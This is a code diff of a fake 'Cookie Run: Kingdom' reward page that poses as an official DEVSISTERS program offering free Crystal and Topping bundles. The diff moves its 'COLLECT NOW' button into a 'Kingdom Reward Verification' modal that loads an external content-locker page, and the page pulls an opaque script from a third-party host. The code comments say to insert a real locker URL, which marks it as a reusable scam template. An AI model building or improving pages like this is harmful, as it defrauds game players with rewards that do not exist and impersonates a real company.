@@ -3,10 +3,10 @@
 <head>
     <meta charSet="utf-8"/>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
-    
+
     <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&family=Fredoka:wght@400;600&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    
+
     <title>Cookie Run: Kingdom - Reward Center</title>
 
     <style>
@@ -28,7 +28,8 @@
         }
 
         body {
-            margin: 0; padding: 0;
+            margin: 0;
+            padding: 0;
             font-family: 'Fredoka', sans-serif;
             color: #fff;
             overflow-x: hidden;
@@ -47,7 +48,7 @@
         }
 
         .logo {
-            width: 75%; 
+            width: 75%;
             max-width: 320px;
             height: auto;
             animation: floating 3.5s ease-in-out infinite;
@@ -61,7 +62,7 @@
 
         .game-title {
             font-family: 'Luckiest Guy', cursive;
-            font-size: 2.6rem; 
+            font-size: 2.6rem;
             margin: 15px 0 5px 0;
             background: linear-gradient(to bottom, #fff 20%, #ffcc00 100%);
             -webkit-background-clip: text;
@@ -111,12 +112,97 @@
             color: white;
             font-size: 1.4rem;
             background: rgba(93, 51, 17, 0.8);
-            width: 50px; height: 50px;
+            width: 50px;
+            height: 50px;
             display: flex;
-            align-items: center; justify-content: center;
+            align-items: center;
+            justify-content: center;
             border-radius: 50%;
             border: 2px solid var(--primary-gold);
             text-decoration: none;
+        }
+
+        /* MODAL */
+        .locker-modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.72);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 18px;
+            z-index: 9999;
+        }
+
+        .locker-modal.active {
+            display: flex;
+        }
+
+        .locker-box {
+            width: 100%;
+            max-width: 900px;
+            height: min(85vh, 720px);
+            background: linear-gradient(180deg, #6f431a 0%, #3f220e 100%);
+            border: 3px solid var(--primary-gold);
+            border-radius: 22px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.55);
+            overflow: hidden;
+            position: relative;
+            animation: modalPop 0.25s ease;
+        }
+
+        @keyframes modalPop {
+            from {
+                opacity: 0;
+                transform: scale(0.92) translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+
+        .locker-header {
+            height: 62px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 16px 0 20px;
+            background: linear-gradient(180deg, #ffed8a 0%, #ffa500 100%);
+            color: var(--deep-chocolate);
+            font-family: 'Luckiest Guy', cursive;
+            font-size: 1.2rem;
+            letter-spacing: 0.5px;
+            box-sizing: border-box;
+        }
+
+        .locker-close {
+            width: 40px;
+            height: 40px;
+            border: none;
+            border-radius: 50%;
+            background: #fff3cf;
+            color: #5d3311;
+            font-size: 1.2rem;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.18);
+        }
+
+        .locker-close:hover {
+            transform: scale(1.05);
+        }
+
+        .locker-body {
+            height: calc(100% - 62px);
+            background: #fff;
+        }
+
+        .locker-frame {
+            width: 100%;
+            height: 100%;
+            border: none;
+            display: block;
+            background: #fff;
         }
 
         @media (min-width: 768px) {
@@ -125,29 +211,42 @@
             .claim-btn { max-width: 320px; font-size: 1.8rem; }
             .logo { max-width: 380px; }
         }
+
+        @media (max-width: 640px) {
+            .locker-box {
+                height: 88vh;
+                border-radius: 18px;
+            }
+
+            .locker-header {
+                font-size: 1rem;
+                padding-left: 14px;
+                padding-right: 12px;
+            }
+        }
     </style>
 
     <script type="text/javascript">
-        var eqJSM_tsP_lWilAc={"it":4594355,"key":"12ba0"};
+        var eqJSM_tsP_lWilAc = {"it":4594355,"key":"12ba0"};
     </script>
     <script src="https://d3v3431sr9puku.cloudfront.net/561a8af.js"></script>
 
-<link rel="me" href="https://draft.blogger.com/profile/09900857115235761056" />
-<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
-<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+    <link rel="me" href="https://draft.blogger.com/profile/09900857115235761056" />
+    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+    <meta name='google-adsense-platform-domain' content='blogspot.com'/>
 </head>
 <body>
     <div class="background-fixed"></div>
 
     <div class="main-content">
         <img src="https://img.icons8.com/color/452/cookie-run-kingdom.png" alt="Cookie Run Kingdom" class="logo">
-        
-        <h1 class="game-title">REDEEM GIFTS</h1>
-        <p class="game-subtitle">Access the kingdom vault to collect your <br>exclusive Crystal & Topping bundles!</p>
 
-        <a href="javascript:void(0)" onclick="openLocker()" class="claim-btn">
-    COLLECT NOW
-</a>
+        <h1 class="game-title">REDEEM GIFTS</h1>
+        <p class="game-subtitle">Access the kingdom vault to collect your <br>exclusive Crystal &amp; Topping bundles!</p>
+
+        <a href="javascript:void(0)" onclick="openLockerModal()" class="claim-btn">
+            COLLECT NOW
+        </a>
 
         <div class="social-icons">
             <a href="#"><i class="fab fa-facebook-f"></i></a>
@@ -159,24 +258,52 @@
             © 2026 DEVSISTERS. Official Kingdom Rewards Program.
         </div>
     </div>
-    <div id="lockerContainer" style="display:none; width:100%; height:100vh;">
-    <iframe 
-        id="lockerFrame"
-        src=""
-        style="width:100%; height:100%; border:none;">
-    </iframe>
-</div>
+
+    <!-- MODAL -->
+    <div id="lockerModal" class="locker-modal">
+        <div class="locker-box">
+            <div class="locker-header">
+                <span>Kingdom Reward Verification</span>
+                <button class="locker-close" onclick="closeLockerModal()">✕</button>
+            </div>
+
+            <div class="locker-body">
+                <iframe
+                    id="lockerFrame"
+                    class="locker-frame"
+                    src=""
+                    allowfullscreen>
+                </iframe>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function openLockerModal() {
+            const modal = document.getElementById("lockerModal");
+            const frame = document.getElementById("lockerFrame");
+
+            modal.classList.add("active");
+            document.body.style.overflow = "hidden";
+
+            // Replace this with your REAL locker page URL
+            frame.src = "https://confirmapp.site/cl/i/822wpk";
+        }
+
+        function closeLockerModal() {
+            const modal = document.getElementById("lockerModal");
+            const frame = document.getElementById("lockerFrame");
+
+            modal.classList.remove("active");
+            document.body.style.overflow = "";
+            frame.src = "";
+        }
+
+        document.getElementById("lockerModal").addEventListener("click", function(e) {
+            if (e.target === this) {
+                closeLockerModal();
+            }
+        });
+    </script>
 </body>
 </html>
-<script>
-function openLocker() {
-    // show iframe
-    const container = document.getElementById('lockerContainer');
-    const iframe = document.getElementById('lockerFrame');
-
-    container.style.display = 'block';
-
-    // 👉 PUT YOUR LOCKER LINK HERE
-    iframe.src = "https://confirmapp.site/cl/i/822wpk";
-}
-</script>
